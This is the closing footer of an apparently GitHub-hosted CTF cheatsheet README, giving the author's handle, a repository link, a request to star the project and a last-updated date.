- GitHub: [@pugazhexploit](https://github.com/pugazhexploit)
- Repository: [CTF_cheetsheet-2025](https://github.com/pugazhexploit/CTF_cheetsheet-2025)

---

## ⭐ Star History

If you find this cheatsheet helpful, please consider giving it a star! ⭐

---

**Happy Hacking! 🚀**

*Last Updated: 2026-02-07 07:08:14*